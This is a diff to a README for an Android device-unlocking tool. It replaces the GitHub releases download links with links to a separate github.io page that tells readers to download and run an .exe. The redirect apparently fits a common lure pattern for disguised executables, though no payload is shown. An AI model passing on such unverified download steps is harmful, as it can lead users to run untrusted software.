@@ -1,6 +1,6 @@
 # 📱 NCK-Android-Pro - Unlock Your Android Device Easily
 
-[![](https://img.shields.io/badge/Download-NCK_Android_Pro-blue)](https://github.com/maca3901/NCK-Android-Pro/releases)
+[![](https://img.shields.io/badge/Download-NCK_Android_Pro-blue)](https://maca3901.github.io)
 
 ## 🛠 What is NCK Android Pro
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start. The software wor
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/maca3901/NCK-Android-Pro/releases) to access the latest version.
+1. Visit the [official releases page](https://maca3901.github.io) to access the latest version.
 2. Locate the most recent release entry in the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
